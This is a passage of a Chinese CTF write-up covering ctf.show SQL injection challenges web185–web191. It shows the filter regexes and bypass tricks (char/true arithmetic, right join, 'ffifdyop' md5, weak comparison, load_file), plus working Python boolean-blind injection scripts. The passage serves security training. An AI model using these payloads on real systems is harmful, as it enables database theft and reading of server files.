operator">+</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web185-true绕过数字"><a href="#web185-true绕过数字" class="headerlink" title="web185(true绕过数字)"></a>web185(true绕过数字)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>数字被ban了</p><p><img src="web185.png" loading="lazy"></p><p><strong>方法一</strong>：可以使用concat来拼接字符串</p><p><img src="web185_2.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">formatString</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">"concat("</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        tip <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>            tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tip <span class="token operator">=</span> <span class="token number">1</span>            temp <span class="token operator">+=</span> <span class="token string">"char("</span>            tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            temp <span class="token operator">+=</span> <span class="token string">"false"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            temp_d <span class="token operator">=</span> <span class="token string">"("</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">"true+"</span>            temp_d <span class="token operator">=</span> temp_d<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>            <span class="token keyword">if</span> tip <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                temp_d <span class="token operator">+=</span> <span class="token string">")"</span>            temp <span class="token operator">+=</span> temp_d        temp <span class="token operator">+=</span> <span class="token string">","</span>    temp <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">")"</span>    <span class="token keyword">return</span> temp<span class="token comment"># print(formatString("0x63746673686f777b"))</span>url <span class="token operator">=</span> <span class="token string">"https://8ea77825-d310-4375-b330-8826bf8db1a3.challenge.ctf.show/select-waf.php"</span><span class="token comment"># dic的顺序可以改一下！我是懒得改了！改顺序可以提高效率！！！</span>dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_"</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user group by pass having pass regexp(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>formatString<span class="token punctuation">(</span>flag <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token comment"># print(data)</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> x            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># print("[--] &#123;&#125; is wrong".format(x))</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[flag]:"</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span></code></pre><p><strong>方法二</strong>：继续使用right join</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">creatNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">"true"</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>    <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">'https://16d50b32-c89c-423e-aa09-841d997cb617.challenge.ctf.show/select-waf.php'</span>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;)))"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                creatNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> creatNum<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 43;"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>增加了尖括号，<code>^</code>、<code>%</code>的过滤。<br>上题的payload可用。</p><h4 id="web187-ffifdyop绕过md5"><a href="#web187-ffifdyop绕过md5" class="headerlink" title="web187(ffifdyop绕过md5)"></a>web187(ffifdyop绕过md5)</h4><p>查询语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//拼接sql语句查找指定ID用户</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from ctfshow_user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password= '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>      </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只有admin可以获得flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名不存在'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </code></pre><p><img src="web187.png" loading="lazy"></p><p><strong>ffifdyop||129581926211651571912466741651878684928</strong></p><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt; 即  <code>&#39;or&#39;66�]��!r,��b</code></p><h4 id="web188-弱比较"><a href="#web188-弱比较" class="headerlink" title="web188(&#x3D;&#x3D;弱比较)"></a>web188(&#x3D;&#x3D;弱比较)</h4><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//用户名检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    </code></pre><p>payload是：<code>username=0 password=0</code></p><p>在比较查询的时候，查询语句为：<code>select pass from ctfshow_user where username = 0 and password = 0;</code>，由于<code>username password</code>是字符串，弱比较成了0,0&#x3D;0成立，所条件就成立了；最后查询语句就成了：<code>select pass from ctfshow_user where 1;</code></p><p>[<img src="web188.png" loading="lazy"></p><h4 id="web189-locate-load-file"><a href="#web189-locate-load-file" class="headerlink" title="web189(locate load_file)"></a>web189(locate load_file)</h4><p><strong>Hint</strong>：flag在api&#x2F;index.php文件中</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//用户名检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'用户名非法'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码检测</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'密码只能为数字'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//密码判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   </code></pre><p>根据提示，先利用locate定位flag的位置，然后使用盲注来得到flag</p><blockquote><p>LOCATE(字符串1,字符串2)</p><p>返回字符串1在字符串2中第一次出现的位置，只要字符串2中包含字符串1，那么返回值必然大于0。</p></blockquote><blockquote><p>username&#x3D;0、password&#x3D;0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username&#x3D;1、password&#x3D;0时，返回“查询失败”。（说明用户不存在）</p></blockquote><p>可以利用以上返回情况来进行if逐字符盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://deb43701-a2f5-42bf-817a-f374b486bcdf.challenge.ctf.show/api/'</span><span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">1</span>    tail <span class="token operator">=</span> <span class="token number">300</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(locate('ctfshow&#123;',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))>&#123;&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">return</span> mid<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        head <span class="token operator">=</span> <span class="token number">32</span>        tail <span class="token operator">=</span> <span class="token number">127</span>        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),&#123;0&#125;,1))>&#123;1&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>            <span class="token punctuation">&#125;</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                tail <span class="token operator">=</span> mid            <span class="token comment"># mid += 1</span>        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    mid <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span>    getFlag<span class="token punctuation">(</span>mid<span class="token punctuation">)</span></code></pre><p>还有一个没有采用二分算法的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">"&#125;&#123;&lt;>$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#这个位置，是群主耗费很长时间跑出来的位置~</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">257</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(substr(load_file('/var/www/html/api/index.php'),&#123;&#125;,1)=('&#123;&#125;'),1,0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8d25"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++ &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>flag<span class="token operator">+=</span>x<span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web190-常规bool-blind"><a href="#web190-常规bool-blind" class="headerlink" title="web190(常规bool blind)"></a>web190(常规bool blind)</h4><p>输入 admin&#x2F;123 输出密码错误</p><p>输入 test&#x2F;123 输出用户名不存在</p><p>说明存在账号 admin</p><hr><p>输入 admin’ and 1&#x3D;1 # 输出密码错误</p><p>输入 admin’ and 1&#x3D;2 # 输出用户名不存在</p><p>说明存在布尔盲注的条件</p><hr><p>pass 长度为5 值为 admin</p><p>admin’ and length(pass) &#x3D; 5 #</p><p>admin’ and pass &#x3D; ‘admin’ #</p><p>说明 flag 并不是 pass 的值</p><p>接下来就是正常的盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://55202cb2-6c46-4248-a593-31a004489e2a.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># 查数据库  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># 查字段  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select f1ag from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin' and if(ascii(substr((&#123;0&#125;),&#123;1&#125;,1))>&#123;2&#125;,1,2)='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"密码错误"</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web191-ord"><a href="#web191-ord" class="headerlink" title="web191(ord)"></a>web191(ord)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:感觉少了个啥，奇怪</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii/i'</span><span class="token 